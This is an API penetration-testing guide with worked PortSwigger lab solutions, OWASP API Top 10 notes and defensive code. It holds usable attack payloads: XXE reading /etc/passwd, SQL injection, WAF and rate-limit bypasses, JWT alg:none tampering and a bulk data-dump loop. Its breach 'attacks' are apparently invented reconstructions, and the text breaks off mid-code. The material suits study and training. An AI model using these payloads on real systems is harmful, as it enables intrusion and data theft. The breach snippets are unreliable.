# API Testing - Comprehensive Attack Guide

## Table of Contents
1. [PortSwigger API Testing Labs](#portswigger-labs)
2. [OWASP API Security Top 10 (2023)](#owasp-api-security)
3. [Attack Techniques & Methodologies](#attack-techniques)
4. [Burp Suite Extensions](#burp-extensions)
5. [Testing Tools & Frameworks](#testing-tools)
6. [Real-World Breaches](#real-world-breaches)
7. [WAF Bypass Techniques](#waf-bypass)
8. [Secure Development Practices](#secure-development)

---

## PortSwigger API Testing Labs {#portswigger-labs}

### Lab 1: Exploiting an API Endpoint Using Documentation

**Difficulty:** APPRENTICE

**Objective:** Delete user "carlos" by exploiting exposed API documentation

**Credentials:** `wiener:peter`

**Vulnerability Type:** Exposed API Documentation / Improper Access Controls

**Solution Steps:**

1. Login with credentials and update email to generate API traffic
2. In Burp Proxy > HTTP history, locate `PATCH /api/user/wiener` request
3. Send to Repeater and remove `/wiener` from path → `/api/user`
4. Remove `/user` to reach `/api` → returns interactive API documentation
5. Right-click response → "Show response in browser"
6. In documentation, find DELETE operation, enter "carlos" as username
7. Submit deletion request

**HTTP Requests:**
```http
PATCH /api/user/wiener HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[token]

GET /api/user HTTP/1.1
→ Error: Missing user identifier

GET /api HTTP/1.1
→ Returns API documentation

DELETE /api/user/carlos HTTP/1.1
→ Success
```

**Key Vulnerabilities:**
- API documentation exposed without authentication
- DELETE operations accessible to regular users
- No authorization checks on administrative operations

**Common Mistakes:**
- Not checking parent paths of discovered endpoints
- Overlooking interactive documentation features
- Failing to test different HTTP methods

**Real-World Impact:** Many organizations expose Swagger/OpenAPI documentation without authentication, enabling attackers to map entire API surfaces

---

### Lab 2: Finding and Exploiting an Unused API Endpoint

**Difficulty:** APPRENTICE

**Objective:** Purchase "Lightweight l33t Leather Jacket" by manipulating product price

**Credentials:** `wiener:peter`

**Vulnerability Type:** Improper HTTP Method Restrictions / Mass Assignment

**Solution Steps:**

1. Browse to product page and capture `/api/products/1/price` request
2. Send to Repeater and change method from `GET` to `OPTIONS`
   - Response reveals: `Allow: GET, PATCH`
3. Try `PATCH` without auth → 401 Unauthorized
4. Login with `wiener:peter`
5. Send `PATCH` request → Error: missing Content-Type header
6. Add `Content-Type: application/json` with empty body `{}`
   - Error: missing price parameter
7. Send `PATCH` with `{"price":0}`
8. Reload product page → price changed to $0.00
9. Add to cart and complete purchase

**HTTP Requests:**
```http
OPTIONS /api/products/1/price HTTP/1.1
→ Allow: GET, PATCH

PATCH /api/products/1/price HTTP/1.1
Content-Type: application/json
Cookie: session=[token]

{"price":0}
→ 200 OK
```

**Exploitation Methods:**
1. OPTIONS method enumeration for allowed methods
2. Error message analysis to discover parameters
3. Price manipulation through unrestricted PATCH endpoint

**Attack Variations:**
- Negative price values
- Extremely small decimals (0.01)
- Modify other attributes (stock, name, description)
- Batch modifications for multiple products

**Bypass Techniques:**
- Alternative encodings: `application/x-www-form-urlencoded`
- Unicode in numeric fields
- Array payloads: `{"price":[0]}`

---

### Lab 3: Exploiting a Mass Assignment Vulnerability

**Difficulty:** APPRENTICE

**Objective:** Apply 100% discount through mass assignment

**Credentials:** `wiener:peter`

**Vulnerability Type:** Mass Assignment / Auto-binding

**Solution Steps:**

1. Login and add Leather Jacket to basket
2. Attempt purchase → insufficient credit
3. In Proxy history, compare `GET /api/checkout` and `POST /api/checkout`
   - GET response contains `chosen_discount` parameter
   - POST request omits this parameter
4. Send POST request to Repeater
5. Inject discovered parameter:
```json
{
  "chosen_discount": {
    "percentage": 100
  },
  "chosen_products": [
    {
      "product_id": "1",
      "quantity": 1
    }
  ]
}
```
6. Submit → purchase succeeds with 100% discount

**HTTP Requests:**
```http
GET /api/checkout HTTP/1.1
Response:
{
  "chosen_discount": {"percentage": 0},
  "chosen_products": [...]
}

POST /api/checkout HTTP/1.1
Content-Type: application/json

{
  "chosen_discount": {"percentage": 100},
  "chosen_products": [{"product_id": "1", "quantity": 1}]
}
→ Success
```

**Attack Variations:**
- Negative percentages for credit gains
- Values >100 (150% discount)
- Multiple discount objects
- Other hidden fields: `shipping_cost`, `tax_rate`

**Bypass Techniques:**
- Decimal values: `99.999999`
- Alternative field names: `discount_percent`, `discountPercentage`
- Case variations: `Percentage`, `PERCENTAGE`
- Nested structures: `{"discount": {"discount": {"percentage": 100}}}`

**Real-World Examples:**
- **GitHub 2012:** Mass assignment allowed uploading public keys to any organization
- **E-commerce:** Manipulation of loyalty points, referral credits
- **SaaS:** Users upgrade features by injecting premium flags

---

### Lab 4: Exploiting Server-Side Parameter Pollution in Query String

**Difficulty:** PRACTITIONER

**Objective:** Extract administrator's password reset token via parameter pollution

**Vulnerability Type:** Server-Side Parameter Pollution (SSPP)

**Solution Steps:**

**Phase 1: Discovery**
1. Initiate password reset for administrator
2. Examine `/forgot-password` POST request
3. Test invalid username → "Invalid username" error

**Phase 2: Injection Testing**
4. Inject `%26x=y` → "Parameter is not supported"
5. Use `%23` truncation → "Field not specified"
6. Inject `username=administrator%26field=x%23` → "Invalid field"

**Phase 3: Parameter Enumeration**
7. Use Burp Intruder with payload: `administrator%26field=§PARAM§%23`
8. Wordlist: "Server-side variable names"
9. Identify valid fields: `email`, `username`, `reset_token`

**Phase 4: Exploitation**
10. Request: `username=administrator%26field=reset_token%23`
11. Server returns password reset token
12. Use token to reset administrator password
13. Login and delete carlos

**Key Payloads:**

| Payload | URL-Encoded | Purpose | Result |
|---------|-------------|---------|--------|
| `admin#` | `admin%23` | Truncate query | Field not specified |
| `admin&x=y` | `admin%26x=y` | Inject parameter | Parameter not supported |
| `admin&field=x#` | `admin%26field=x%23` | Add field param | Invalid field |
| `admin&field=reset_token#` | `admin%26field=reset_token%23` | Extract token | Token returned |

**Error Messages & Meaning:**

| Error | Meaning | Next Action |
|-------|---------|-------------|
| Invalid username | Validation active | Use valid username |
| Parameter not supported | Injection detected | Continue manipulation |
| Field not specified | Additional params exist | Inject field parameter |
| Invalid field | Field param recognized | Brute-force valid fields |

**Burp Suite Features:**
- Proxy for traffic analysis
- Repeater for manual testing
- Intruder for field enumeration with wordlists

**Technology-Specific Behavior:**

Different backends handle duplicate parameters differently:
- **PHP:** Uses last parameter value
- **ASP.NET:** Combines with commas
- **Node.js/Express:** Uses first value
- **Python/Flask:** Returns list of all values

---

### Lab 5: Exploiting Server-Side Parameter Pollution in REST URL

**Difficulty:** PRACTITIONER

**Objective:** Extract password reset token via REST path traversal

**Vulnerability Type:** Server-Side Parameter Pollution in REST paths

**Solution Steps:**

**Phase 1: Behavioral Analysis**
1. Test parameter manipulation:
   - `administrator#` (`%23`) → "Invalid route"
   - `administrator?` (`%3F`) → "Invalid route"
   - `./administrator` → original response
   - `../administrator` → "Invalid route"

**Phase 2: API Discovery**
2. Progressive path traversal with `../` sequences
3. Test: `../../../../openapi.json%23`
4. Returns API structure: `/api/internal/v1/users/{username}/field/{field}`

**Phase 3: Exploitation**
5. Test field validity: `administrator/field/foo%23` → error
6. Valid field: `administrator/field/email%23` → success
7. Extract token: `../../v1/users/administrator/field/passwordResetToken%23`
8. Use token to reset password and delete carlos

**Key Payloads:**

| Payload | Backend Interpretation | Result |
|---------|----------------------|--------|
| `admin%23` | `/api/.../admin#` | Invalid route |
| `..%2fadmin` | `/api/.../../admin` | Invalid route |
| `..%2f..%2f..%2f..%2fopenapi.json%23` | `/../../../../openapi.json#` | API spec |
| `..%2f..%2fv1%2fusers%2fadmin%2ffield%2fpasswordResetToken%23` | `/api/../v1/users/admin/field/passwordResetToken` | Token |

**Alternative Traversal Sequences:**
- `....//` (bypass filters)
- `..;/` (semicolon separator)
- `..\` (Windows paths)
- `%2e%2e%2f` (double encoding)

**Common API Documentation Paths:**
```
/openapi.json
/swagger.json
/api-docs
/v1/api-docs
/api/swagger.json
```

**Comparison with Query String SSPP:**

| Aspect | Query String | REST Path |
|--------|-------------|-----------|
| Injection Point | Query parameters | URL path segments |
| Separators | `&`, `?`, `#` | `/`, `.`, `#` |
| Discovery | Error messages | Path traversal + OpenAPI |
| Complexity | Easier | More complex |

---

## OWASP API Security Top 10 (2023) {#owasp-api-security}

### API1:2023 - Broken Object Level Authorization (BOLA)

**Description:** APIs expose endpoints handling object identifiers without proper authorization checks.

**Attack Scenarios:**
- `GET /api/users/123` → change to 456 for unauthorized access
- `GET /api/documents/abc` → iterate through document IDs
- `POST /api/orders/789` → modify other users' orders

**Real-World Examples:**
- **Trello 2024:** 15M users' data exposed via API lacking authorization
- **Dating App:** Users accessed reporter information via object ID manipulation

**Prevention:**
1. Authorization checks on every request
2. Use UUIDs instead of sequential IDs
3. Validate user ownership before returning data
4. Log suspicious access patterns

**Vulnerable Code:**
```python
@app.route('/api/users/<user_id>')
def get_user(user_id):
    user = User.query.get(user_id)  # No authorization!
    return jsonify(user.data)
```

**Secure Code:**
```python
@app.route('/api/users/<user_id>')
@login_required
def get_user(user_id):
    if current_user.id != user_id and not current_user.is_admin:
        return jsonify({"error": "Unauthorized"}), 403
    user = User.query.get(user_id)
    return jsonify(user.data)
```

---

### API2:2023 - Broken Authentication

**Description:** Improperly implemented authentication mechanisms allowing token compromise or exploit.

**Attack Scenarios:**
1. Weak password policies
2. Missing rate limiting on login
3. Tokens in URLs or logs
4. Session fixation

**Real-World Examples:**
- **Cox Communications 2024:** API accessible without authentication
- **SOLARMAN 2024:** JWT signature not verified
- **DeepSeek 2025:** Database accessible without authentication

**Prevention:**
1. Strong password policies
2. Multi-factor authentication (MFA)
3. Rate limiting on auth endpoints
4. Secure token generation (JWT with proper signing)
5. Never expose tokens in URLs
6. Rotate credentials regularly

---

### API3:2023 - Broken Object Property Level Authorization

**Description:** Combines Excessive Data Exposure and Mass Assignment - inadequate property-level access control.

**Attack Scenarios:**
1. Accessing restricted patient data fields
2. User modifies `isAdmin` field for privilege escalation
3. Manipulating transaction amounts
4. Reducing prices via hidden fields

**Prevention:**
1. Use DTOs with explicit field definitions
2. Field-level authorization
3. Whitelist updatable properties
4. Blacklist sensitive fields
5. Separate read and write models

**Framework Protection:**

**Spring MVC:**
```java
@InitBinder
public void initBinder(WebDataBinder binder) {
    binder.setAllowedFields("email", "username", "password");
    binder.setDisallowedFields("isAdmin", "role");
}
```

**Node.js:**
```javascript
const allowedFields = ['email', 'username', 'password'];
const user = new User(_.pick(req.body, allowedFields));
```

---

### API4:2023 - Unrestricted Resource Consumption

**Description:** Lack of rate limiting and resource controls leading to DoS or increased costs.

**Attack Scenarios:**
1. Unlimited API requests exhausting resources
2. Large payload attacks
3. Expensive operations triggered repeatedly
4. Storage exhaustion via unlimited uploads

**Prevention:**
1. Rate limiting (requests per minute/hour)
2. Maximum payload sizes
3. Request timeouts
4. Pagination for large datasets
5. Cost-based throttling
6. Anomaly detection

---

### API5:2023 - Broken Function Level Authorization

**Description:** Complex access control with authorization flaws exposing admin functions.

**Attack Scenarios:**
1. Regular user accessing `/api/admin/users`
2. Using PUT/DELETE on GET-only endpoints
3. Accessing privileged operations without role checks

**Prevention:**
1. Role-based access control (RBAC)
2. Deny all by default
3. Check authorization on every function
4. Separate admin and user controllers
5. Test all HTTP methods

---

### API6:2023 - Unrestricted Access to Sensitive Business Flows

**Description:** APIs expose business flows without protecting against automated abuse.

**Attack Scenarios:**
1. Ticket scalping bots
2. Inventory manipulation by bots
3. Price manipulation via automation
4. Comment spam

**Prevention:**
1. CAPTCHA for sensitive operations
2. Device fingerprinting
3. Behavioral analysis
4. Transaction velocity checks
5. Human verification steps

---

### API7:2023 - Server Side Request Forgery (SSRF)

**Description:** APIs fetch remote resources without validating URIs, allowing internal system access.

**Attack Scenarios:**
1. Cloud metadata: `http://169.254.169.254/latest/meta-data/`
2. Internal service access
3. Port scanning internal network
4. File system: `file:///etc/passwd`

**Prevention:**
1. URL allowlisting
2. Disable HTTP redirects
3. Validate and sanitize URLs
4. Network segmentation
5. Block private IP ranges

---

### API8:2023 - Security Misconfiguration

**Description:** Complex configurations missed during implementation.

**Common Issues:**
1. Exposed error messages with stack traces
2. Missing security headers
3. Unnecessary HTTP methods enabled
4. CORS misconfiguration
5. Default credentials
6. Verbose error messages

**Prevention:**
1. Secure default configurations
2. Regular security audits
3. Automated configuration scanning
4. Disable unnecessary features
5. Generic error messages
6. Proper CORS policies

---

### API9:2023 - Improper Inventory Management

**Description:** Inadequate documentation and tracking of API endpoints/versions.

**Risks:**
1. Forgotten legacy endpoints with vulnerabilities
2. Undocumented APIs lacking security controls
3. Multiple versions with inconsistent security
4. Shadow APIs unknown to security teams

**Prevention:**
1. Maintain comprehensive API inventory
2. Document all endpoints and versions
3. Automated discovery tools
4. Regular security assessments
5. Deprecate old versions systematically

---

### API10:2023 - Unsafe Consumption of APIs

**Description:** Developers trust third-party APIs more than user input.

**Attack Scenarios:**
1. Compromised third-party API responses
2. Data injection from external APIs
3. Unsafe redirects from APIs
4. XML/JSON injection via trusted APIs

**Prevention:**
1. Validate and sanitize all API responses
2. Allowlist expected data formats
3. Implement timeouts
4. Verify SSL/TLS certificates
5. Monitor third-party API changes
6. Treat external data as untrusted

---

## Attack Techniques & Methodologies {#attack-techniques}

### API Reconnaissance

**Passive Reconnaissance:**
- HTML source code analysis for API references
- JavaScript file examination for API calls
- Browser DevTools network tab monitoring
- Mobile app traffic analysis
- Documentation and support pages
- Google dorking for exposed APIs

**Active Reconnaissance:**
- Burp Suite crawling and spidering
- Directory brute-forcing with API wordlists
- Subdomain enumeration
- Port scanning for API services
- Common API path testing

**Common API Documentation Paths:**
```
/api
/api/v1, /api/v2
/swagger, /swagger-ui, /swagger-ui.html
/api-docs, /api/docs, /docs
/openapi.json, /swagger.json
/api/swagger.json
/v1/api-docs
/__docs__
/redoc
/graphql, /graphiql, /playground
```

---

### Finding Hidden Endpoints

**Burp Intruder Approach:**

1. Identify base path: `/api/users/update`
2. Replace segments with function names
3. Wordlists:
   - REST operations: create, read, update, delete, list, get, post, put, patch
   - CRUD: add, remove, edit, modify, fetch, retrieve
   - Admin: admin, manage, configure, settings

**Example:**
```
Base: PUT /api/user/update
Test: PUT /api/user/§delete§
Payloads: delete, remove, admin, list, get, create
```

**JS Link Finder BApp:**
- Auto-extracts endpoints from JavaScript
- Processes minified/bundled code
- Discovers undocumented endpoints

---

### Finding Hidden Parameters

**1. Param Miner BApp**
- Guesses up to 65,536 parameter names
- Context-aware intelligent guessing
- Tests GET, POST, headers, cookies

**2. Burp Intruder Parameter Discovery**

Common parameter names:
```
id, user_id, userid, username, email
token, access_token, api_key, key
role, admin, isAdmin, is_admin
price, discount, amount, total
password, new_password, current_password
page, limit, offset, count, size
format, type, content_type
callback, redirect, url, next
debug, verbose, trace
```

**3. Mass Assignment Detection**

Steps:
1. GET request to retrieve object
2. Identify all returned fields
3. Compare with UPDATE/POST submitted fields
4. Test adding undocumented fields from GET
5. Observe behavioral changes

Example:
```json
GET /api/user/profile
{
  "username": "user123",
  "email": "user@example.com",
  "role": "user",
  "credit": 100
}

POST /api/user/profile (test injection)
{
  "email": "new@example.com",
  "role": "admin",
  "credit": 999999
}
```

---

### HTTP Method Testing

**Methods to Test:**
- GET, POST, PUT, PATCH, DELETE
- OPTIONS (discover supported methods)
- HEAD, CONNECT, TRACE

**Testing Workflow:**
1. Identify endpoint: `/api/products/123`
2. Send OPTIONS to discover methods
3. Test each discovered method
4. Test undisclosed methods (even if not in OPTIONS)
5. Analyze responses

**Burp Intruder Method Fuzzing:**
```
§METHOD§ /api/products/123 HTTP/1.1
Host: target.com
Content-Type: application/json

{"id": 123, "price": 0}

Payloads: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
```

---

### Content-Type Testing

**Common Content Types:**
```
application/json
application/xml
application/x-www-form-urlencoded
multipart/form-data
text/plain
text/xml
application/soap+xml
application/vnd.api+json
application/graphql
```

**JSON to XML Conversion:**
```json
Original (JSON):
{"username": "admin", "password": "pass"}

Convert to XML:
<?xml version="1.0"?>
<root>
  <username>admin</username>
  <password>pass</password>
</root>
```

**Exploitation Scenario:**
```http
POST /api/login HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
  <username>&xxe;</username>
  <password>pass</password>
</root>
```

**Content Type Converter BApp:** Auto-converts between JSON/XML

---

### Server-Side Parameter Pollution Testing

**Query String Testing Characters:**
```
# (%23) - Truncate query string
& (%26) - Add new parameter
= (%3D) - Parameter assignment
? (%3F) - Query string start
; (%3B) - Parameter separator
%00 - Null byte injection
```

**Testing Methodology:**

```http
# 1. Baseline
POST /api/forgot-password
username=admin

# 2. Truncation
username=admin%23

# 3. Parameter Injection
username=admin%26debug=true

# 4. Parameter Discovery
username=admin%26field=§PARAM§%23

# 5. Exploitation
username=admin%26field=reset_token%23
```

**REST Path Testing:**

```
# Path Traversal
username=../../../../etc/passwd%23
username=..%2f..%2f..%2f..%2fetc%2fpasswd%23

# API Discovery
username=../../../../openapi.json%23
username=../../../../swagger.json%23

# Version Manipulation
username=../../v1/users/admin/field/email%23
username=../../v2/users/admin/field/password%23
```

---

## Burp Suite Extensions {#burp-extensions}

### Essential Extensions for API Testing

**1. OpenAPI Parser**
- Parse OpenAPI 2.0/3.0/3.1 specs
- Import from file or URL
- Auto-generate requests for all endpoints
- Supports JSON and YAML

**Usage:**
1. Extensions → OpenAPI Parser
2. Load specification
3. Review parsed endpoints
4. Right-click → Send to Scanner/Repeater/Intruder

**2. Param Miner**
- Discover hidden parameters
- 65,536+ parameter guesses per request
- Context-aware suggestions
- Tests headers, cookies, GET/POST

**Configuration:**
- Add target to scope
- Passive scan or right-click → Guess parameters
- Review discovered parameters in issues

**3. Content Type Converter**
- Auto-convert JSON ↔ XML
- Bypass input validation
- Test XML injection vulnerabilities

**4. JS Link Finder**
- Extract API endpoints from JavaScript
- Process minified/bundled code
- Passive analysis while browsing

**5. Autorize**
- Automated authorization testing
- Vertical and horizontal privilege escalation
- Compare responses between user roles

**Configuration:**
1. Set up two users (low/high privilege)
2. Browse as high-privilege user
3. Auto-replays as low-privilege
4. Flags authorization issues

**6. Turbo Intruder**
- High-speed fuzzing
- Custom Python scripts
- Race condition handling
- Rate limiting bypass via speed

**7. Active Scan++**
- Additional scan checks:
  - Host header injection
  - CORS misconfigurations
  - Edge Side Includes
  - Template injection

---

## Testing Tools & Frameworks {#testing-tools}

### Commercial Tools

**1. Burp Suite Professional/Enterprise**
- Comprehensive API testing
- OpenAPI import
- Automated scanning
- Extension ecosystem

**2. Postman + Newman**
- API development and testing
- Automated test suites
- Collection-based testing
- CI/CD integration

**3. APIsec**
- Automated API security testing
- Continuous attack scenarios
- Playbook-based testing

**4. 42Crunch**
- Design-first security
- OpenAPI specification analysis
- Security audit scoring
- Runtime protection

**5. Salt Security / Traceable AI**
- AI-powered threat detection
- Behavioral analysis
- API discovery and inventory
- Real-time blocking

---

### Open-Source Tools

**1. OWASP ZAP**
- Free Burp alternative
- API scanning capabilities
- OpenAPI import support
- Extensive automation

**Installation:**
```bash
brew install --cask owasp-zap  # macOS
apt install zaproxy             # Debian/Ubuntu
```

**2. Ffuf (Fuzz Faster U Fool)**
- Fast web fuzzer
- Excellent for endpoint discovery
- Flexible matching and filtering

**Usage:**
```bash
# Endpoint discovery
ffuf -u https://api.target.com/v1/FUZZ -w api-endpoints.txt

# Parameter discovery
ffuf -u https://api.target.com/user?FUZZ=value -w params.txt

# Method fuzzing
ffuf -u https://api.target.com/api -w methods.txt -X FUZZ
```

**3. Arjun**
- HTTP parameter discovery
- Multi-threading support
- Passive and active detection

**Usage:**
```bash
# Basic discovery
arjun -u https://api.target.com/endpoint

# Custom wordlist
arjun -u https://api.target.com/endpoint -w params.txt

# POST testing
arjun -u https://api.target.com/api -m POST
```

**4. Kiterunner**
- API endpoint discovery
- OpenAPI/Swagger support
- Fast brute-forcing

**Usage:**
```bash
# Quick scan
kr scan https://api.target.com -w routes-large.kite

# Swagger discovery
kr brute https://api.target.com -w swagger-wordlist.txt

# With authentication
kr scan https://api.target.com -w routes.kite -H "Authorization: Bearer TOKEN"
```

**5. Nuclei**
- Template-based vulnerability scanner
- API-specific templates
- Fast and customizable

**Usage:**
```bash
# API security scanning
nuclei -u https://api.target.com -t api/

# Custom templates
nuclei -u https://api.target.com -t my-api-templates/

# With rate limiting
nuclei -u https://api.target.com -rl 10 -t api/
```

**6. APICheck**
- API testing and monitoring toolkit
- Modular architecture
- Multiple specialized tools

**7. GraphQL Tools**

**GraphQL Cop:**
```bash
# Security audit
graphql-cop -t https://api.target.com/graphql

# Check introspection
graphql-cop -t https://api.target.com/graphql --introspection
```

**InQL Scanner (Burp Extension):**
- GraphQL introspection
- Query generation
- Mutation testing

---

### Wordlists for API Testing

**SecLists Collection:**
```
Discovery/Web-Content/api/
- api-endpoints.txt
- api-endpoints-res.txt
- graphql.txt
- swagger.txt

Fuzzing/
- api-parameters.txt
- http-methods.txt
- content-types.txt
```

**Custom Wordlist Creation:**
```bash
# Extract endpoints from JavaScript
cat *.js | grep -oP '(?<=")\/api[^"]*' | sort -u > api-endpoints.txt

# Extract parameters from Burp history
jq -r '.[] | .request.url' burp-history.json | grep -oP '\?[^&]+' > params.txt

# Common patterns
/api/v{1..5}/{users,products,orders,admin}/{create,read,update,delete,list}
```

---

## Real-World Breaches (2024-2025) {#real-world-breaches}

### Trello (2024)

**Vulnerability:** API1:2023 - Broken Object Level Authorization

**Impact:** 15 million users' email addresses and account info

**Attack:**
```http
GET /api/users?email=victim@example.com HTTP/1.1
→ Returns user data without authentication
```

**Missed Prevention:**
- No rate limiting on user lookup
- Email enumeration unprotected
- No authentication on sensitive endpoints
- Missing anomaly detection

---

### Cox Communications (2024)

**Vulnerability:** API2 + API5 - Broken Authentication + Function Authorization

**Impact:** Millions of Cox modems vulnerable, complete account takeover

**Attack:**
```http
POST /api/admin/customer-lookup HTTP/1.1
{"modem_id": "TARGET_MAC", "action": "remote_config"}
→ Admin access without authentication
```

**Missed Prevention:**
- No authentication on admin functions
- Missing role-based access control
- No authorization checks on privileged operations

---

### Dell (2024)

**Vulnerability:** API4:2023 - Unrestricted Resource Consumption

**Impact:** 49 million customer records breached

**Attack Pattern:**
```python
for customer_id in range(1, 50000000):
    response = requests.get(
        f"https://dell-api.com/customers/{customer_id}",
        headers={"API-Key": "PARTNER_KEY"}
    )
    # No rate limiting, no anomaly detection
```

**Missed Prevention:**
- No rate limiting per API key
- Missing velocity checks
- No anomaly detection for bulk access
- Insufficient logging

---

### SOLARMAN (2024)

**Vulnerability:** API2:2023 - Broken Authentication (JWT)

**Impact:** JWT signature not verified, authentication bypass

**Attack:**
```javascript
// Original JWT
{
  "header": {"alg": "HS256", "typ": "JWT"},
  "payload": {"user_id": "123", "role": "user"}
}

// Tampered JWT (signature not verified!)
{
  "header": {"alg": "none"},
  "payload": {"user_id": "123", "role": "admin"},
  "signature": ""  // Empty signature accepted!
}
```

**Missed Prevention:**
- JWT signature verification disabled
- No algorithm whitelist enforcement
- Missing token validation

---

### DeepSeek (January 2025)

**Vulnerability:** API8:2023 - Security Misconfiguration

**Impact:** ClickHouse database publicly accessible, 1M+ log entries exposed

**Attack:**
```http
# Direct database access via browser
http://deepseek-database.com:8123/

SELECT * FROM chat_logs LIMIT 1000000;
SELECT api_key, user_id FROM users;
```

**Missed Prevention:**
- Default database configuration in production
- No network segmentation
- Missing authentication layer
- Publicly accessible database ports

---

### Coinbase (2025)

**Vulnerability:** API6:2023 - Unrestricted Business Flows

**Impact:** $250,000 bug bounty, logic vulnerability in trading API

**Attack:**
```http
POST /api/trade/sell HTTP/1.1
{
  "asset_to_sell": "ETH",
  "amount": 0.5,
  "sell_as_asset": "BTC",  // Logic flaw
  "expected_value_usd": 1000
}
→ Sold $1000 ETH as $43,000 BTC
```

**Missed Prevention:**
- No business logic validation
- Asset type mismatch not detected
- Missing transaction integrity checks

---

### Common Attack Patterns

**1. Sequential ID Enumeration:**
```python
for id in range(1, 1000000):
    data = api_call(f"/api/users/{id}")
    if data.status_code == 200:
        exfiltrate(data)
```

**2. Parameter Manipulation:**
```json
// Standard
{"user_id": "123", "action": "view"}

// Manipulated
{"user_id": "456", "action": "admin_access", "bypass": true}
```

**3. Authentication Bypass:**
```http
GET /api/internal/admin/users HTTP/1.1
# No Authorization header required!
```

**4. Mass Data Exfiltration:**
```bash
while true; do
    curl "https://api.target.com/data?page=$i" >> dump.txt
    i=$((i+1))
    sleep 0.1  # Bypass basic rate limiting
done
```

---

## WAF Bypass Techniques (2025) {#waf-bypass}

### 1. Encoding and Obfuscation

**URL Encoding Variations:**
```
Normal:        admin' OR 1=1--
Single encode: admin%27%20OR%201%3D1--
Double encode: admin%2527%2520OR%25201%253D1--
Unicode:       admin\u0027 OR 1=1--
Mixed:         admin%27 OR 1%3d1--
```

**Case Randomization:**
```sql
SeLeCt * FrOm users WhErE username='admin'
```

**Inline Comments:**
```sql
SEL/**/ECT * FR/**/OM users
SEL/*comment*/ECT * FR//OM users
SEL/*! ECT*/ * FR/*! OM*/ users
```

---

### 2. Content-Type Manipulation

**JSON to XML Bypass:**
```http
# Original (blocked)
POST /api/login HTTP/1.1
Content-Type: application/json
{"username":"admin' OR '1'='1","password":"pass"}

# Bypass
POST /api/login HTTP/1.1
Content-Type: application/xml
<?xml version="1.0"?>
<root>
  <username>admin' OR '1'='1</username>
  <password>pass</password>
</root>
```

---

### 3. HTTP Parameter Pollution

**Framework-Specific Behavior:**

**PHP (uses last):**
```http
user=normal&user=admin
# PHP sees: user=admin
```

**ASP.NET (concatenates):**
```http
user=normal&user=admin
# ASP.NET sees: user=normal,admin
```

**Node.js (uses first):**
```http
user=admin&user=normal
# Node.js sees: user=admin
```

---

### 4. Header Injection

```http
X-Forwarded-For: ' OR 1=1--
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
True-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
```

---

### 5. SQLMap Tamper Scripts

```bash
# Random case
sqlmap -u "http://target.com/api?id=1" --tamper=randomcase

# Space to comment
sqlmap -u "http://target.com/api?id=1" --tamper=space2comment

# Unicode encode
sqlmap -u "http://target.com/api?id=1" --tamper=charunicodeencode

# Multiple tampers
sqlmap -u "http://target.com/api?id=1" --tamper=randomcase,space2comment,charunicodeencode
```

**Custom Tamper Script:**
```python
def tamper(payload):
    payload = payload.replace(" ", "/**/")
    payload = ''.join(choice((c.upper(), c.lower())) for c in payload)
    payload += "&dummy=value&foo=bar"
    return payload
```

---

### 6. Next.js Middleware Bypass (CVE-2025-29927)

```http
GET /api/admin HTTP/1.1
x-middleware-subreq: skip
# Bypass Next.js middleware completely
```

---

### 7. JSON Injection Variations

**Unicode Escaping:**
```json
{
  "username": "\u0061\u0064\u006d\u0069\u006e"
}
// Decodes to: admin
```

**Null Byte:**
```json
{
  "username": "user\u0000admin"
}
```

---

### 8. Rate Limiting Bypass

**IP Rotation:**
```http
X-Forwarded-For: 1.2.3.4, 5.6.7.8, 9.10.11.12
X-Originating-IP: 192.168.1.100
True-Client-IP: 10.0.0.5
```

**Distributed Requests:**
```python
# Rotate User-Agents
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 (X11; Linux x86_64)'
]

# Rotate endpoints
endpoints = ['/api/v1/data', '/api/v2/data', '/api/data']

# Add random parameters
for i in range(1000):
    requests.get(
        random.choice(endpoints),
        headers={'User-Agent': random.choice(user_agents)},
        params={'_': str(time.time()), 'cache': random.randint(1, 999999)}
    )
```

---

## Secure Development Practices {#secure-development}

### 1. Authentication & Authorization

**Secure API Authentication:**
```python
from flask import Flask, request, jsonify
from functools import wraps
import jwt

def require_jwt(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization', '').replace('Bearer ', '')
        try:
            payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
            request.current_user = payload
        except jwt.InvalidTokenError:
            return jsonify({"error": "Invalid token"}), 401
        return f(*args, **kwargs)
    return decorated

def require_role(role):
    def decorator(f):
        @wraps(f)
        def decorated(*args, **kwargs):
            if request.current_user.get('role') != role:
                return jsonify({"error": "Forbidden"}), 403
            return f(*args, **kwargs)
        return decorated
    return decorator

@app.route('/api/admin/users')
@require_jwt
@require_role('admin')
def admin_users():
    return jsonify(get_all_users())
```

---

### 2. Input Validation & Sanitization

```python
from marshmallow import Schema, fields, validates, ValidationError
import bleach

class UserSchema(Schema):
    username = fields.Str(required=True, validate=lambda s: 3 <= len(s) <= 20)
    email = fields.Email(required=True)
    age = fields.Int(validate=lambda n: 0 < n < 150)

    @validates('username')
    def validate_username(self, value):
        if not value.isalnum():
            raise ValidationError("Username must be alphanumeric")
        return bleach.clean(value)

@app.route('/api/users', methods=['POST'])
def create_user():
    schema = UserSchema()
    try:
        data = schema.load(request.json)
    except ValidationError as err:
        return jsonify({"errors": err.messages}), 400

    user = create_user_in_db(data)
    return jsonify(user), 201
```

---

### 3. Preventing Mass Assignment

```python
class UserCreateDTO:
    allowed_fields = ['username', 'email', 'password']

    def __init__(self, data):
        # Only extract allowed fields
        self.data = {k: v for k, v in data.items() if k in self.allowed_fields}

    def to_model(self):
        user = User()
        for key, value in self.data.items():
            setattr(user, key, value)
        # Server sets sensitive fields
        user.role = 'user'  # NOT from user input
        user.is_active = False
        user.created_at = datetime.now()
        return user
```

---

### 4. Rate Limiting & Resource Protection

```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

@app.route('/api/login', methods=['POST'])
